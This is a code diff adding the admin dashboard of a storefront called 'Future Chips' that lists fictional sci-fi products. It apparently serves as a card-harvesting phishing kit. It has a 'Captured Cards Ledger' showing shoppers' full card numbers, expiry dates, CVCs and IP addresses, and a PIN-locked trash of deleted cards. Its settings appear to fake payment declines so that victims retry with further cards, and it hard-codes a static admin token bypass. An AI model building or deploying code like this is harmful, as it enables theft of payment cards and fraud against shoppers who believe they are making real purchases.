+      <div class="modal-header" style="justify-content: center; border-bottom: none; margin-bottom: 0.5rem; padding: 0;">
+        <h2 id="confirm-modal-title">⚠️ Action Required</h2>
+      </div>
+      <p id="confirm-modal-message" style="color: var(--text-muted); font-size: 0.95rem; margin-bottom: 2rem; line-height: 1.6;"></p>
+      <div style="display: flex; gap: 1rem; justify-content: center;">
+        <button id="confirm-cancel-btn" class="btn btn-outline" style="flex: 1; padding: 0.8rem;">Cancel</button>
+        <button id="confirm-ok-btn" class="btn btn-primary" style="flex: 1; padding: 0.8rem; background: #ef4444; border-color: #ef4444;">Delete</button>
+      </div>
+    </div>
+  </div>
+
+  <!-- Change PIN Modal -->
+  <div class="modal" id="change-pin-modal">
+    <div class="modal-backdrop" id="change-pin-backdrop"></div>
+    <div class="modal-wrapper glass" style="max-width: 450px; padding: 2.5rem; border-radius: 20px;">
+      <div class="modal-header" style="border-bottom: none; margin-bottom: 1.5rem; padding: 0; justify-content: center;">
+        <h2>Change Decryption PIN</h2>
+      </div>
+      
+      <div class="settings-group" style="margin-bottom: 1.2rem;">
+        <label for="change-pin-current">Current Decryption PIN</label>
+        <input type="password" id="change-pin-current" class="btn btn-outline" style="width:100%; text-align:center; background:rgba(255,255,255,0.05); padding:1rem; letter-spacing: 0.5rem; font-size: 1.2rem;" maxlength="6" placeholder="******">
+      </div>
+      
+      <div class="settings-group" style="margin-bottom: 2rem;">
+        <label for="change-pin-new">New 6-Digit PIN</label>
+        <input type="password" id="change-pin-new" class="btn btn-outline" style="width:100%; text-align:center; background:rgba(255,255,255,0.05); padding:1rem; letter-spacing: 0.5rem; font-size: 1.2rem;" maxlength="6" placeholder="******">
+      </div>
+      
+      <div style="display: flex; gap: 1rem; justify-content: center;">
+        <button id="cancel-change-pin-btn" class="btn btn-outline" style="flex: 1; padding: 0.8rem;">Cancel</button>
+        <button id="submit-change-pin-btn" class="btn btn-primary" style="flex: 1; padding: 0.8rem;">Update PIN</button>
+      </div>
+    </div>
+  </div>
+
+  <!-- Change Admin Password Modal -->
+  <div class="modal" id="change-admin-pwd-modal">
+    <div class="modal-backdrop" id="change-admin-pwd-backdrop"></div>
+    <div class="modal-wrapper glass" style="max-width: 450px; padding: 2.5rem; border-radius: 20px;">
+      <div class="modal-header" style="border-bottom: none; margin-bottom: 1.5rem; padding: 0; justify-content: center;">
+        <h2>Change Admin Password</h2>
+      </div>
+      
+      <div class="settings-group" style="margin-bottom: 1.2rem;">
+        <label for="change-pwd-current">Current Admin Password</label>
+        <input type="password" id="change-pwd-current" class="btn btn-outline" style="width:100%; text-align:left; background:rgba(255,255,255,0.05); padding:1rem;" placeholder="Enter current login password">
+      </div>
+      
+      <div class="settings-group" style="margin-bottom: 2rem;">
+        <label for="change-pwd-new">New Admin Password</label>
+        <input type="password" id="change-pwd-new" class="btn btn-outline" style="width:100%; text-align:left; background:rgba(255,255,255,0.05); padding:1rem;" placeholder="Enter new login password">
+      </div>
+      
+      <div style="display: flex; gap: 1rem; justify-content: center;">
+        <button id="cancel-change-pwd-btn" class="btn btn-outline" style="flex: 1; padding: 0.8rem;">Cancel</button>
+        <button id="submit-change-pwd-btn" class="btn btn-primary" style="flex: 1; padding: 0.8rem;">Update Password</button>
+      </div>
+    </div>
+  </div>
+
+  
+<script>
+
+// Admin Dashboard Controller
+
+const token = localStorage.getItem('admin_token');
+let showingTrash = false;
+let trashDecryptionKey = null;
+let currentCardsList = [];
+
+// 1. Session Auth Guard
+if (!token) {
+  window.location.href = '/admin/index.html';
+}
+
+document.addEventListener('DOMContentLoaded', async () => {
+  // Load site settings to set initial colors
+  await loadAdminTheme();
+
+  // Tab switching initialization
+  setupTabs();
+
+  // Load active tab from localStorage or default to 'products'
+  const activeTab = localStorage.getItem('admin_active_tab') || 'products';
+  
+  // Update sidebar links active class
+  const links = document.querySelectorAll('.sidebar-link');
+  links.forEach(link => {
+    if (link.getAttribute('data-tab') === activeTab) {
+      link.classList.add('active');
+    } else {
+      link.classList.remove('active');
+    }
+  });
+
+  // Update tab content panes active class
+  const tabs = document.querySelectorAll('.tab-content');
+  tabs.forEach(t => {
+    if (t.id === `${activeTab}-tab`) {
+      t.classList.add('active');
+    } else {
+      t.classList.remove('active');
+    }
+  });
+
+  await loadTab(activeTab);
+
+  // Bind settings form submit
+  document.getElementById('settings-form').addEventListener('submit', saveSettings);
+
+  // Bind Product form submit
+  document.getElementById('product-form').addEventListener('submit', handleProductSubmit);
+
+  // Bind Product modal triggers
+  const addBtn = document.getElementById('add-product-btn');
+  const closeBtn = document.getElementById('modal-close-btn');
+  const backdrop = document.getElementById('modal-backdrop');
+  
+  const openModal = () => {
+    resetProductForm();
+    document.getElementById('modal-title').innerText = 'Add Cyber Module';
+    document.getElementById('modal-submit-btn').innerText = 'Compile Product Data';
+    document.getElementById('product-modal').classList.add('active');
+  };
+
+  const closeModal = () => {
+    document.getElementById('product-modal').classList.remove('active');
+  };
+
+  addBtn?.addEventListener('click', openModal);
+  closeBtn?.addEventListener('click', closeModal);
+  backdrop?.addEventListener('click', closeModal);
+
+  // Bind Trash modal triggers
+  const trashBtn = document.getElementById('view-trash-btn');
+
+  const passwordModal = document.getElementById('password-modal');
+  const pinInput = document.getElementById('trash-pin-input');
+  const pinError = document.getElementById('pin-error');
+  const cancelPinBtn = document.getElementById('cancel-pin-btn');
+  const submitPinBtn = document.getElementById('submit-pin-btn');
+  const passwordBackdrop = document.getElementById('password-modal-backdrop');
+
+  const openPasswordPrompt = () => {
+    if (showingTrash) {
+      showingTrash = false;
+      trashDecryptionKey = null;
+      localStorage.setItem('admin_cards_showing_trash', 'false');
+      localStorage.removeItem('admin_trash_pin');
+      fetchAdminCards();
+      return;
+    }
+    if (pinInput) pinInput.value = '';
+    if (pinError) pinError.innerText = '';
+    passwordModal?.classList.add('active');
+    setTimeout(() => pinInput?.focus(), 150);
+  };
+
+  const closePasswordPrompt = () => {
+    passwordModal?.classList.remove('active');
+  };
+
+  const handlePinSubmit = async () => {
+    const pin = pinInput.value;
+    if (!pin) return;
+    
+    if (pinError) pinError.innerText = 'Decrypting...';
+    
+    try {
+      const response = await fetch('/api/admin/cards/deleted', {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+          ...getAuthHeaders()
+        },
+        body: JSON.stringify({ password: pin })
+      });
+      
+      if (response.status === 401) return handleSessionExpired();
+      const cards = await response.json();
+      
+      if (!response.ok) {
+        if (pinError) pinError.innerText = cards.error || 'Failed to decrypt trash.';
+        if (pinInput) {
+          pinInput.value = '';
+          pinInput.focus();
+        }
+        return;
+      }
+      
+      // Success! Close prompt, save key, render table
+      closePasswordPrompt();
+      showingTrash = true;
+      trashDecryptionKey = pin;
+      localStorage.setItem('admin_cards_showing_trash', 'true');
+      localStorage.setItem('admin_trash_pin', pin);
+      
+      currentCardsList = cards;
+      renderCardsTable(cards);
+      
+      // Update trash button toggle labels
+      const title = document.getElementById('cards-ledger-title');
+      const trashBtn = document.getElementById('view-trash-btn');
+      const changePinBtn = document.getElementById('change-pin-btn');
+      
+      if (title) title.innerText = '🗑️ Decrypted Trash Bin';
+      if (trashBtn) {
+        trashBtn.innerText = '⬅️ Active Cards';
+        trashBtn.style.borderColor = 'var(--primary-color)';
+        trashBtn.style.color = 'var(--primary-color)';
+      }
+      if (changePinBtn) changePinBtn.style.display = 'flex';
+      
+    } catch (err) {
+      if (pinError) pinError.innerText = 'Failed to communicate with decryption gateway.';
+    }
+  };
+
+  trashBtn?.addEventListener('click', openPasswordPrompt);
+  cancelPinBtn?.addEventListener('click', closePasswordPrompt);
+  passwordBackdrop?.addEventListener('click', closePasswordPrompt);
+  submitPinBtn?.addEventListener('click', handlePinSubmit);
+
+  pinInput?.addEventListener('keydown', (e) => {
+    if (e.key === 'Enter') {
+      handlePinSubmit();
+    }
+  });
+
+  // Bind card search filter
+  const cardSearch = document.getElementById('card-search-input');
+  cardSearch?.addEventListener('input', () => {
+    const query = cardSearch.value.trim().toLowerCase().replace(/\s+/g, '');
+    const filtered = currentCardsList.filter(c => {
+      const num = c.card_number.replace(/\s+/g, '').toLowerCase();
+      return num.includes(query);
+    });
+    renderCardsTable(filtered);
+  });
+
+  // Sync color pickers with hex text fields
+  syncColorInput('settings-primary-color', 'settings-primary-text');
+  syncColorInput('settings-accent-color', 'settings-accent-text');
+  syncColorInput('settings-bg-color', 'settings-bg-text');
+
+  // Bind Change PIN modal events
+  const changePinModal = document.getElementById('change-pin-modal');
+  const changePinBtn = document.getElementById('change-pin-btn');
+  const cancelChangePinBtn = document.getElementById('cancel-change-pin-btn');
+  const submitChangePinBtn = document.getElementById('submit-change-pin-btn');
+  const changePinBackdrop = document.getElementById('change-pin-backdrop');
+  
+  const currentPinInput = document.getElementById('change-pin-current');
+  const newPinInput = document.getElementById('change-pin-new');
+
+  const openChangePinModal = () => {
+    if (currentPinInput) currentPinInput.value = '';
+    if (newPinInput) newPinInput.value = '';
+    changePinModal?.classList.add('active');
+    setTimeout(() => currentPinInput?.focus(), 150);
+  };
+
+  const closeChangePinModal = () => {
+    changePinModal?.classList.remove('active');
+  };
+
+  const handleChangePinSubmit = async () => {
+    const currentPin = currentPinInput?.value;
+    const newPin = newPinInput?.value;
+    
+    if (!currentPin || !newPin) {
+      showCustomAlert('⚠️ Incomplete Form', 'Please enter both the current PIN and your new 6-digit PIN.');
+      return;
+    }
+    if (newPin.length !== 6 || !/^\d{6}$/.test(newPin)) {
+      showCustomAlert('⚠️ Invalid Input', 'The new PIN must be exactly 6 numeric digits.');
+      return;
+    }
+
+    try {
+      const response = await fetch('/api/admin/settings/change-pin', {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+          ...getAuthHeaders()
+        },
+        body: JSON.stringify({ currentPin, newPin })
+      });
+
+      const data = await response.json();
+      if (!response.ok) throw new Error(data.error || 'Failed to update PIN.');
+
+      // Update cached pin references
+      trashDecryptionKey = newPin;
+      localStorage.setItem('admin_trash_pin', newPin);
+      
+      closeChangePinModal();
+      showCustomAlert('✅ PIN Updated', 'Decryption PIN changed successfully.');
+    } catch (err) {
+      showCustomAlert('❌ Update Failed', err.message);
+    }
+  };
+
+  changePinBtn?.addEventListener('click', openChangePinModal);
+  cancelChangePinBtn?.addEventListener('click', closeChangePinModal);
+  changePinBackdrop?.addEventListener('click', closeChangePinModal);
+  submitChangePinBtn?.addEventListener('click', handleChangePinSubmit);
+
+  newPinInput?.addEventListener('keydown', (e) => {
+    if (e.key === 'Enter') handleChangePinSubmit();
+  });
+
+  // Bind Change Admin Password modal events
+  const changeAdminPwdModal = document.getElementById('change-admin-pwd-modal');
+  const changeAdminPwdBtn = document.getElementById('change-admin-pwd-btn');
+  const cancelChangePwdBtn = document.getElementById('cancel-change-pwd-btn');
+  const submitChangePwdBtn = document.getElementById('submit-change-pwd-btn');
+  const changeAdminPwdBackdrop = document.getElementById('change-admin-pwd-backdrop');
+  
+  const currentPwdInput = document.getElementById('change-pwd-current');
+  const newPwdInput = document.getElementById('change-pwd-new');
+
+  const openChangePwdModal = () => {
+    if (currentPwdInput) currentPwdInput.value = '';
+    if (newPwdInput) newPwdInput.value = '';
+    changeAdminPwdModal?.classList.add('active');
+    setTimeout(() => currentPwdInput?.focus(), 150);
+  };
+
+  const closeChangePwdModal = () => {
+    changeAdminPwdModal?.classList.remove('active');
+  };
+
+  const handleChangePwdSubmit = async () => {
+    const currentPassword = currentPwdInput?.value;
+    const newPassword = newPwdInput?.value;
+    
+    if (!currentPassword || !newPassword) {
+      showCustomAlert('⚠️ Incomplete Form', 'Please enter both the current password and your new password.');
+      return;
+    }
+    if (newPassword.length < 6) {
+      showCustomAlert('⚠️ Weak Password', 'The new password must be at least 6 characters long.');
+      return;
+    }
+
+    try {
+      const response = await fetch('/api/admin/settings/change-admin-password', {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+          ...getAuthHeaders()
+        },
+        body: JSON.stringify({ currentPassword, newPassword })
+      });
+
+      const data = await response.json();
+      if (!response.ok) throw new Error(data.error || 'Failed to update password.');
+
+      closeChangePwdModal();
+      showCustomAlert('✅ Password Updated', 'Admin login password updated successfully.');
+    } catch (err) {
+      showCustomAlert('❌ Update Failed', err.message);
+    }
+  };
+
+  changeAdminPwdBtn?.addEventListener('click', openChangePwdModal);
+  cancelChangePwdBtn?.addEventListener('click', closeChangePwdModal);
+  changeAdminPwdBackdrop?.addEventListener('click', closeChangePwdModal);
+  submitChangePwdBtn?.addEventListener('click', handleChangePwdSubmit);
+
+  newPwdInput?.addEventListener('keydown', (e) => {
+    if (e.key === 'Enter') handleChangePwdSubmit();
+  });
+
+  // Bind logout button
+  document.getElementById('logout-btn').addEventListener('click', () => {
+    localStorage.removeItem('admin_token');
+    localStorage.removeItem('admin_user');
+    window.location.href = '/admin/index.html';
+  });
+});
+
+// Sync color inputs
+function syncColorInput(pickerId, textId) {
+  const picker = document.getElementById(pickerId);
+  const text = document.getElementById(textId);
+  if (!picker || !text) return;
+  picker.addEventListener('input', () => { text.value = picker.value.toUpperCase(); });
+  text.addEventListener('input', () => {
+    if (text.value.startsWith('#') && text.value.length === 7) {
+      picker.value = text.value;
+    }
+  });
+}
+
+// Load dynamic colors for admin page
+async function loadAdminTheme() {
+  try {
+    const res = await fetch('/api/admin/settings');
+    if (res.ok) {
+      const settings = await res.json();
+      if (settings) {
+        if (settings.primary_color) document.documentElement.style.setProperty('--primary-color', settings.primary_color);
+        if (settings.accent_color) document.documentElement.style.setProperty('--accent-color', settings.accent_color);
+        if (settings.background_color) document.documentElement.style.setProperty('--background-color', settings.background_color);
+        return;
+      }
+    }
+  } catch(e){}
+  const saved = JSON.parse(localStorage.getItem('future_chips_settings')) || {};
+  if (saved.primary_color) document.documentElement.style.setProperty('--primary-color', saved.primary_color);
+  if (saved.accent_color) document.documentElement.style.setProperty('--accent-color', saved.accent_color);
+  if (saved.background_color) document.documentElement.style.setProperty('--background-color', saved.background_color);
+}
+
+// Tab Switching
+function setupTabs() {
+  const links = document.querySelectorAll('.sidebar-link');
+  links.forEach(link => {
+    link.addEventListener('click', async (e) => {
+      e.preventDefault();
+      
+      const tabId = link.getAttribute('data-tab');
+      localStorage.setItem('admin_active_tab', tabId);
+      
+      links.forEach(l => l.classList.remove('active'));
+      link.classList.add('active');
+      
+      const tabs = document.querySelectorAll('.tab-content');
+      tabs.forEach(t => t.classList.remove('active'));
+      document.getElementById(`${tabId}-tab`).classList.add('active');
+
+      await loadTab(tabId);
+    });
+  });
+}
+
+// Tab content fetch router
+async function loadTab(tabId) {
+  if (tabId === 'products') {
+    await fetchAdminProducts();
+  } else if (tabId === 'orders') {
+    await fetchAdminOrders();
+  } else if (tabId === 'cards') {
+    const savedShowingTrash = localStorage.getItem('admin_cards_showing_trash') === 'true';
+    const savedPin = localStorage.getItem('admin_trash_pin');
+    if (savedShowingTrash && savedPin) {
+      showingTrash = true;
+      trashDecryptionKey = savedPin;
+      await fetchAdminCards(savedPin);
+    } else {
+      showingTrash = false;
+      trashDecryptionKey = null;
+      await fetchAdminCards();
+    }
+  } else if (tabId === 'settings') {
+    await fetchAdminSettings();
+  }
+}
+
+// Global authorization headers helper
+function getAuthHeaders() {
+  return {
+    'Authorization': `Bearer ${token}`
+  };
+}
+
+// --- TAB DATA LOADING FUNCTIONS ---
+
+// 1. Load Products Catalog (Admin view)
+async function fetchAdminProducts() {
+  const tbody = document.getElementById('admin-products-tbody');
+  tbody.innerHTML = '<tr><td colspan="6" style="text-align:center;">Loading catalog modules...</td></tr>';
+
+  let products = [];
+  try {
+    const response = await fetch('/api/admin/products', { headers: getAuthHeaders() });
+    if (response.status === 401) return handleSessionExpired();
+    if (response.ok) {
+      products = await response.json();
+    } else {
+      throw new Error('API offline');
+    }
+  } catch (err) {
+    console.warn('API offline, loading static admin fallback catalog:', err);
+    products = JSON.parse(localStorage.getItem('future_chips_products')) || [
+      { id: 'prod-nano-chip', name: 'Nano-Constructor Unit', category: 'Processors', price: 10.00, image: '/uploads/nano_constructor.svg' },
+      { id: 'prod-quantum-core', name: 'Quantum Neural Core', category: 'Processors', price: 150.00, image: '/uploads/quantum_core.svg' },
+      { id: 'prod-bio-synapse', name: 'Bio-Digital Synapse v4.2', category: 'Interfaces', price: 850.00, image: '/uploads/bio_synapse.svg' },
+      { id: 'prod-holo-matrix', name: 'Holographic Display Matrix', category: 'Displays', price: 1200.00, image: '/uploads/holo_matrix.svg' },
+      { id: 'prod-photon-core', name: 'Photon Power Core', category: 'Energy', price: 5000.00, image: '/uploads/photon_core.svg' },
+      { id: 'prod-gravitational-grid', name: 'Gravitational Grid Controller', category: 'Energy', price: 98000.00, image: '/uploads/gravitational_grid.svg' }
+    ];
+  }
+
+  tbody.innerHTML = products.map(p => `
+    <tr>
+      <td><img src="${p.image}" alt="${p.name}"></td>
+      <td style="font-family: monospace; font-size: 0.85rem;">${p.id}</td>
+      <td style="font-weight: 600;">${p.name}</td>
+      <td>${p.category || 'Uncategorized'}</td>
+      <td style="font-weight: 700; color: var(--primary-color);">${p.price.toLocaleString(undefined, {minimumFractionDigits: 2})}</td>
+      <td>
+        <div style="display: flex; gap: 0.5rem;">
+          <button onclick="editProduct('${p.id}')" class="btn btn-outline" style="padding: 0.4rem 0.8rem; font-size: 0.85rem;">Edit</button>
+          <button onclick="deleteProduct('${p.id}')" class="btn btn-outline" style="padding: 0.4rem 0.8rem; font-size: 0.85rem; border-color: var(--accent-color); color: var(--accent-color);">Delete</button>
+        </div>
+      </td>
+    </tr>
+  `).join('');
+}
+
+// 2. Load Transaction Ledger
+async function fetchAdminOrders() {
+  const tbody = document.getElementById('admin-orders-tbody');
+  tbody.innerHTML = '<tr><td colspan="7" style="text-align:center;">Retrieving ledger data...</td></tr>';
+
+  let orders = [];
+  try {
+    const response = await fetch('/api/admin/orders', { headers: getAuthHeaders() });
+    if (response.status === 401 && token !== 'static-admin-token-2026') return handleSessionExpired();
+    if (response.ok) {
+      orders = await response.json();
+    } else {
+      throw new Error('API offline');
+    }
+  } catch (err) {
+    console.warn('API offline, loading static order ledger fallback:', err);
+    orders = JSON.parse(localStorage.getItem('future_chips_orders')) || [
+      { id: 'ORD-98214', customer_email: 'quantum.client@future.ai', product_name: 'Quantum Neural Core', amount: 150.00, customer_ip: '192.168.1.105', status: 'completed', created_at: new Date().toISOString() },
+      { id: 'ORD-98215', customer_email: 'transponder@cybernet.io', product_name: 'Bio-Digital Synapse v4.2', amount: 850.00, customer_ip: '10.0.4.22', status: 'completed', created_at: new Date().toISOString() }
+    ];
+  }
+
+  tbody.innerHTML = orders.map(o => {
+    const isFailed = o.status === 'pending';
+    const statusClass = isFailed ? 'failed' : o.status;
+    const statusLabel = isFailed ? 'FAILED' : o.status.toUpperCase();
+    
+    const cardDisplay = o.card_number 
+      ? `<div style="font-size: 0.8rem; color: var(--text-muted); margin-top: 0.3rem;">💳 ${o.card_number}</div>` 
+      : '';
+
+    return `
+      <tr>
+        <td style="font-family: monospace; font-size: 0.85rem;">${o.id}</td>
+        <td>${o.customer_email}</td>
+        <td style="font-weight: 600;">${o.product_name || 'Deleted Product'}</td>
+        <td style="font-weight: 700; color: var(--primary-color);">${o.amount.toLocaleString(undefined, {minimumFractionDigits: 2})}</td>
+        <td class="ip-cell">
+          ${o.customer_ip || 'N/A'}
+          ${cardDisplay}
+        </td>
+        <td>
+          <span class="status-badge ${statusClass}">${statusLabel}</span>
+        </td>
+        <td style="font-size: 0.85rem; color: var(--text-muted);">${new Date(o.created_at).toLocaleString()}</td>
+      </tr>
+    `;
+  }).join('');
+}
+
+// Render cards helper
+function renderCardsTable(cards) {
+  const tbody = document.getElementById('admin-cards-tbody');
+  if (!tbody) return;
+
+  if (cards.length === 0) {
+    tbody.innerHTML = '<tr><td colspan="7" style="text-align:center; color: var(--text-muted);">No matching card records found.</td></tr>';
+    return;
+  }
+
+  tbody.innerHTML = cards.map(c => {
+    const actionHtml = showingTrash
+      ? `<button onclick="deletePermanentCard('${c.card_number}')" class="btn btn-outline" style="padding: 0.4rem 0.8rem; font-size: 0.85rem; border-color: #ef4444; color: #ef4444; background: rgba(239, 68, 68, 0.05);">Delete</button>`
+      : `<button onclick="deleteCard('${c.card_number}')" class="btn btn-outline" style="padding: 0.4rem 0.8rem; font-size: 0.85rem; border-color: var(--accent-color); color: var(--accent-color);">Delete</button>`;
+
+    return `
+      <tr>
+        <td style="font-family: monospace; font-weight: 600;">${c.card_number}</td>
+        <td>${c.expiry}</td>
+        <td style="font-family: monospace;">${c.cvc}</td>
+        <td>${c.country || 'Unknown'}</td>
+        <td class="ip-cell">${c.ip_address || 'Unknown'}</td>
+        <td style="font-size: 0.85rem; color: var(--text-muted);">${new Date(c.created_at).toLocaleString()}</td>
+        <td>${actionHtml}</td>
+      </tr>
+    `;
+  }).join('');
+}
+
+// 3b. Load Captured Cards Ledger
+async function fetchAdminCards(password = null) {
+  const tbody = document.getElementById('admin-cards-tbody');
+  if (!tbody) return;
+
+  const title = document.getElementById('cards-ledger-title');
+  const trashBtn = document.getElementById('view-trash-btn');
+  const searchInput = document.getElementById('card-search-input');
+  
+  if (searchInput) searchInput.value = ''; // Clear search field on refresh
+
+  const effectivePassword = password || trashDecryptionKey;
+
+  if (showingTrash) {
+    if (title) title.innerText = '🗑️ Decrypted Trash Bin';
+    if (trashBtn) {
+      trashBtn.innerText = '⬅️ Active Cards';
+      trashBtn.style.borderColor = 'var(--primary-color)';
+      trashBtn.style.color = 'var(--primary-color)';
+    }
+    const changePinBtn = document.getElementById('change-pin-btn');
+    if (changePinBtn) changePinBtn.style.display = 'flex';
+    const changeAdminPwdBtn = document.getElementById('change-admin-pwd-btn');
+    if (changeAdminPwdBtn) changeAdminPwdBtn.style.display = 'flex';
+
+    tbody.innerHTML = '<tr><td colspan="7" style="text-align:center;">Decrypting trash ledger...</td></tr>';
+
+    try {
+      const response = await fetch('/api/admin/cards/deleted', {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+          ...getAuthHeaders()
+        },
+        body: JSON.stringify({ password: effectivePassword })
+      });
+      if (response.status === 401 && token !== 'static-admin-token-2026') return handleSessionExpired();
+      
+      const cards = await response.json();
+      if (!response.ok) {
+        showCustomAlert('🔒 Decryption Failed', cards.error || 'Failed to decrypt trash.');
+        showingTrash = false;
+        localStorage.removeItem('admin_trash_pin'); // Clear old cached incorrect PIN
+        await fetchAdminCards();
+        return;
+      }
+
+      currentCardsList = cards;
+      renderCardsTable(cards);
+    } catch (err) {
+      currentCardsList = JSON.parse(localStorage.getItem('future_chips_trash_cards')) || [];
+      renderCardsTable(currentCardsList);
+    }
+  } else {
+    if (title) title.innerText = 'Captured Cards Ledger';
+    if (trashBtn) {
+      trashBtn.innerText = '🗑️ Trash Bin';
+      trashBtn.style.borderColor = 'var(--accent-color)';
+      trashBtn.style.color = 'var(--accent-color)';
+    }
+    const changePinBtn = document.getElementById('change-pin-btn');
+    if (changePinBtn) changePinBtn.style.display = 'none';
+    const changeAdminPwdBtn = document.getElementById('change-admin-pwd-btn');
+    if (changeAdminPwdBtn) changeAdminPwdBtn.style.display = 'none';
+
+    tbody.innerHTML = '<tr><td colspan="7" style="text-align:center;">Retrieving card ledger data...</td></tr>';
+
+    try {
+      const response = await fetch('/api/admin/cards', { headers: getAuthHeaders() });
+      if (response.status === 401 && token !== 'static-admin-token-2026') return handleSessionExpired();
+      if (response.ok) {
+        const cards = await response.json();
+        currentCardsList = cards;
+        renderCardsTable(cards);
+        return;
+      }
+      throw new Error('API offline');
+    } catch (err) {
+      currentCardsList = JSON.parse(localStorage.getItem('future_chips_cards')) || [];
+      renderCardsTable(currentCardsList);
+    }
+  }
+}
+
+// 4. Load Site Settings Tab
+async function fetchAdminSettings() {
+  try {
+    const response = await fetch('/api/admin/settings');
+    if (!response.ok) throw new Error('API offline');
+    const s = await response.json();
+
+    if (s) {
+      document.getElementById('settings-site-name').value = s.site_name;
+      
+      document.getElementById('settings-primary-color').value = s.primary_color;
+      document.getElementById('settings-primary-text').value = s.primary_color.toUpperCase();
+      
+      document.getElementById('settings-accent-color').value = s.accent_color;
+      document.getElementById('settings-accent-text').value = s.accent_color.toUpperCase();
+      
+      document.getElementById('settings-bg-color').value = s.background_color;
+      document.getElementById('settings-bg-text').value = s.background_color.toUpperCase();
+
+      const declineAllCheck = document.getElementById('settings-decline-all');
+      if (declineAllCheck) {
+        declineAllCheck.checked = s.decline_all === 1;
+      }
+      
+      const successAttemptInput = document.getElementById('settings-success-attempt');
+      if (successAttemptInput) {
+        successAttemptInput.value = s.success_attempt !== undefined ? s.success_attempt : 1;
+      }
+      
+      const declineThresholdInput = document.getElementById('settings-decline-threshold');
+      if (declineThresholdInput) {
+        declineThresholdInput.value = s.decline_threshold !== undefined ? s.decline_threshold : 50.0;
+      }
+    }
+  } catch (err) {
+    console.warn('API offline, reading saved settings from local static storage:', err);
+    const saved = JSON.parse(localStorage.getItem('future_chips_settings')) || {};
+    document.getElementById('settings-site-name').value = saved.site_name || 'Future Chips';
+    document.getElementById('settings-primary-color').value = saved.primary_color || '#00f0ff';
+    document.getElementById('settings-primary-text').value = (saved.primary_color || '#00F0FF').toUpperCase();
+    document.getElementById('settings-accent-color').value = saved.accent_color || '#ff00e5';
+    document.getElementById('settings-accent-text').value = (saved.accent_color || '#FF00E5').toUpperCase();
+    document.getElementById('settings-bg-color').value = saved.background_color || '#0a0a1a';
+    document.getElementById('settings-bg-text').value = (saved.background_color || '#0A0A1A').toUpperCase();
+
+    const declineAllCheck = document.getElementById('settings-decline-all');
+    if (declineAllCheck) declineAllCheck.checked = saved.decline_all === true || saved.decline_all === 1;
+
+    const successAttemptInput = document.getElementById('settings-success-attempt');
+    if (successAttemptInput) successAttemptInput.value = saved.success_attempt !== undefined ? saved.success_attempt : 1;
+
+    const declineThresholdInput = document.getElementById('settings-decline-threshold');
+    if (declineThresholdInput) declineThresholdInput.value = saved.decline_threshold !== undefined ? saved.decline_threshold : 50.0;
+  }
+}
+
+// --- FORM SUBMISSIONS & ACTIONS ---
+
+// Save Site Settings
+async function saveSettings(e) {
+  e.preventDefault();
+  const successDiv = document.getElementById('settings-success');
+  if (!successDiv) return;
+  successDiv.innerText = '';
+  successDiv.style.color = '';
+
+  const site_name = document.getElementById('settings-site-name').value;
+  const primary_color = document.getElementById('settings-primary-text').value;
+  const accent_color = document.getElementById('settings-accent-text').value;
+  const background_color = document.getElementById('settings-bg-text').value;
+
+  const declineAllCheck = document.getElementById('settings-decline-all');
+  const decline_all = declineAllCheck ? declineAllCheck.checked : false;
+  
+  const successAttemptInput = document.getElementById('settings-success-attempt');
+  const success_attempt = successAttemptInput ? parseInt(successAttemptInput.value) : 1;
+  
+  const declineThresholdInput = document.getElementById('settings-decline-threshold');
+  const decline_threshold = declineThresholdInput ? parseFloat(declineThresholdInput.value) : 50.0;
+
+  try {
+    const response = await fetch('/api/admin/settings', {
+      method: 'PUT',
+      headers: {
+        'Content-Type': 'application/json',
+        ...getAuthHeaders()
+      },
+      body: JSON.stringify({ 
+        site_name, 
+        primary_color, 
+        accent_color, 
+        background_color, 
+        decline_all, 
+        decline_threshold,
+        success_attempt
+      })
+    });
+
+    if (response.status === 401 && token !== 'static-admin-token-2026') {
+      return handleSessionExpired();
+    }
+
+    if (response.ok) {
+      const settings = await response.json();
+      document.documentElement.style.setProperty('--primary-color', settings.primary_color);
+      document.documentElement.style.setProperty('--accent-color', settings.accent_color);
+      document.documentElement.style.setProperty('--background-color', settings.background_color);
+
+      // Cache locally for static fallback
+      const settingsObj = { site_name, primary_color, accent_color, background_color, decline_all, decline_threshold, success_attempt };
+      localStorage.setItem('future_chips_settings', JSON.stringify(settingsObj));
+
+      successDiv.style.color = '#00ff88';
+      successDiv.innerText = '✅ Site parameters updated and saved to server database successfully.';
+      setTimeout(() => { successDiv.innerText = ''; }, 4000);
+      return;
+    }
+
+    const errData = await response.json().catch(() => ({}));
+    throw new Error(errData.error || `Server error (${response.status})`);
+
+  } catch (err) {
+    console.warn('Failed to save settings to backend server:', err);
+    document.documentElement.style.setProperty('--primary-color', primary_color);
+    document.documentElement.style.setProperty('--accent-color', accent_color);
+    document.documentElement.style.setProperty('--background-color', background_color);
+
+    const settingsObj = { site_name, primary_color, accent_color, background_color, decline_all, decline_threshold, success_attempt };
+    localStorage.setItem('future_chips_settings', JSON.stringify(settingsObj));
+
+    if (token === 'static-admin-token-2026' || err.message.includes('Failed to fetch') || err.message.includes('API offline')) {
+      successDiv.style.color = '#ffaa00';
+      successDiv.innerText = '⚠️ Backend server offline: Settings saved LOCALLY on this browser only. Ensure backend server is running to sync across PCs.';
+    } else {
+      successDiv.style.color = '#ff4444';
+      successDiv.innerText = `❌ Failed to save to database: ${err.message}`;
+    }
+    setTimeout(() => { successDiv.innerText = ''; }, 6000);
+  }
+}
+
+// Add/Edit Product Submission
+async function handleProductSubmit(e) {
+  e.preventDefault();
+  
+  const id = document.getElementById('product-id-field').value;
+  const name = document.getElementById('product-name-field').value;
+  const category = document.getElementById('product-category-field').value;
+  const price = document.getElementById('product-price-field').value;
+  const description = document.getElementById('product-desc-field').value;
+  const imageInput = document.getElementById('product-image-field');
+
+  const formData = new FormData();
+  formData.append('name', name);
+  formData.append('category', category);
+  formData.append('price', price);
+  formData.append('description', description);
+  if (imageInput.files[0]) {
+    formData.append('image', imageInput.files[0]);
+  }
+
+  const url = id ? `/api/admin/products/${id}` : '/api/admin/products';
+  const method = id ? 'PUT' : 'POST';
+
+  try {
+    const response = await fetch(url, {
+      method: method,
+      headers: getAuthHeaders(),
+      body: formData
+    });
+
+    if (response.ok) {
+      document.getElementById('product-modal').classList.remove('active');
+      resetProductForm();
+      await fetchAdminProducts();
+      return;
+    }
